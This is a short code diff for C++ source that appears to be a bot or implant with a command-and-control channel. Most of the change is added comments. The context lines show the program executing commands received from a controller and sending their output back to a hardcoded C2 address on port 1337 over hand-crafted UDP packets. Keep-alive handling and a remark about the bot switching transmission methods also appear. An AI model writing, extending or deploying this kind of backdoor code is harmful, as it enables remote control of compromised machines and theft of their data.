@@ -34,6 +34,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             output = exec(rawCommand.c_str());
 #endif
 
+            // Building packet to send the response to the C2
             PacketParse::bp_header_t bpHeader{};
             PacketParse::bp_response_t bp_response{};
             bpHeader.header_type = 0x03;
@@ -49,7 +50,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));
 
 #ifdef __unix__
-       
+            // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                  C2IP,
                                                  1337,
@@ -59,6 +60,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
                                                  nextHopMac);
 
 #else
+            // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                 C2IP,
                 1337,
@@ -73,7 +75,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             return 1;
         }
         case 0x04: {
-            // keep alive for future use
+            // keep alive to eventually inform the bot if it needs to switch it's transmission method.
             std::cout << "Received a Keep Alive" << std::endl;
             if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                 currentCmd++;
@@ -107,7 +109,6 @@ void BPHelper::requestAction() {
                                             1337,
                                             1337,
                                             payload);
-    //Firewall Flick
     rawSocket.send(req);
 #else
     std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
